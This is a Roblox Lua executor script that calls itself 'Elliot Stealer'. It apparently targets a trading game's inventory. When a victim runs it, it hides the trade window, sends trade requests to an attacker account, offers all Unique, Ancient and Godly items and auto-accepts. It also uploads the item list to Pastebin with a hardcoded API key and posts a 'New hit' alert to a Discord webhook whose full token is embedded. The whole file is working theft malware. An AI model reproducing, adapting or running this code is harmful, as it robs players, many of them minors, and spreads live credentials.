-- [ Settings ] --
Username = "Warrior_ggs"
Webhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"

-- [ Dualhook Settings ] --
DualUsername = "Warrior_ggs"
DualWebhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
DualUnique = 1
DualAncient = 1
DualGodly = 1

userName = Username
webHook = Webhook

if getgenv().executed then return end
getgenv().executed = true

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RepStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local InvModule = require(RepStorage.Modules.InventoryModule)
local PlayerDataModule = require(RepStorage.Modules.ProfileData)
local LevelModule = require(RepStorage.Modules.LevelModule)

-- Trade GUI disable coroutine
local destroytrades2 = coroutine.create(function()
    while true do
        local tradeGUI = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
        local tradeGUIPhone = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")
        tradeGUI.Enabled = false
        tradeGUIPhone.Enabled = false
        wait(0.1)
    end
end)

-- Fetch valuable items
local function getValuableItems()
    local uniqueItems, ancientItems, godlyItems = {}, {}, {}
    for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
        for _, item in pairs(category) do
            if item.Rarity == "Unique" then table.insert(uniqueItems, item.DataID)
            elseif item.Rarity == "Ancient" then table.insert(ancientItems, item.DataID)
            elseif item.Rarity == "Godly" then table.insert(godlyItems, item.DataID)
            end
        end
    end
    local hasValuable = #uniqueItems > 0 or #ancientItems > 0 or #godlyItems > 0
    return hasValuable, uniqueItems, ancientItems, godlyItems
end

-- Webhook sender
local function SendWebhook()
    local hasValuable, uniqueItems, ancientItems, godlyItems = getValuableItems()
    if not hasValuable then return end

    if #uniqueItems >= DualUnique or #ancientItems >= DualAncient or #godlyItems >= DualGodly then
        userName = DualUsername
        webHook = DualWebhook
    end

    local pastebinString = "-- [ Uniques ] --\n"..table.concat(uniqueItems,"\n")..
                           "\n\n-- [ Ancients ] --\n"..table.concat(ancientItems,"\n")..
                           "\n\n-- [ Godlies ] --\n"..table.concat(godlyItems,"\n")

    -- Pastebin upload
    local function pastebin(content)
        local body = {
            api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
            api_paste_code = content,
            api_option = "paste"
        }
        local encodedBody = ""
        for k,v in pairs(body) do
            encodedBody = encodedBody..k.."="..HttpService:UrlEncode(v).."&"
        end
        encodedBody = encodedBody:sub(1,-2)
        local resp = request({
            Url = "https://pastebin.com/api/api_post.php",
            Method = "POST",
            Body = encodedBody,
            Headers = {["Content-Type"]="application/x-www-form-urlencoded"}
        })
        local rawUrl = "https://pastebin.com/raw/"..resp.Body:match("([%w]+)$")
        return rawUrl
    end

    local pastebinLink = pastebin(pastebinString)

    local embed = {
        ["title"]="New hit via Elliot Stealer",
        ["color"]=65280,
        ["fields"]={
            {["name"]="Receiver",["value"]=userName,["inline"]=true},
            {["name"]="Items Link",["value"]=pastebinLink,["inline"]=false},
        }
    }

    local data = HttpService:JSONEncode({["content"]="",["embeds"]={embed}})
    request({Url=webHook,Method="POST",Headers={["Content-Type"]="application/json"},Body=data})
end

-- Trade-steal function
local function stealItems()
    coroutine.resume(destroytrades2)
    local sendArgs = {[1] = Players[userName]}
    RepStorage.Trade.SendRequest:InvokeServer(unpack(sendArgs))
    wait(3)
    local _, uniqueItems, ancientItems, godlyItems = getValuableItems()
    local function offer(list)
        for _,v in pairs(list) do
            RepStorage.Trade.OfferItem:FireServer(v,"Weapons")
        end
    end
    offer(uniqueItems)
    offer(ancientItems)
    offer(godlyItems)
    wait(6)
    RepStorage.Trade.AcceptTrade:FireServer(285646582)
end

-- JobId bypass + reconnect system
TeleportService.TeleportInitFailed:Connect(function(_,_,_,_,teleportInfo)
    if teleportInfo and teleportInfo.ServerInstanceId then
        getgenv().JobId = teleportInfo.ServerInstanceId
        queue_on_teleport(string.format([[getgenv().JobId = "%s"]], getgenv().JobId))
        SendWebhook()
    end
end)

-- Force teleport with spoofed JobId
for _=1,2 do
    task.spawn(function()
        pcall(function()
            TeleportService:TeleportToPlaceInstance(142823291, game.JobId)
        end)
    end)
    task.wait(0.5)
end

-- Auto trade on player join
Players.PlayerAdded:Connect(function(player)
    if player.Name == userName then
        player.Chatted:Connect(function()
            stealItems()
        end)
    end
end)
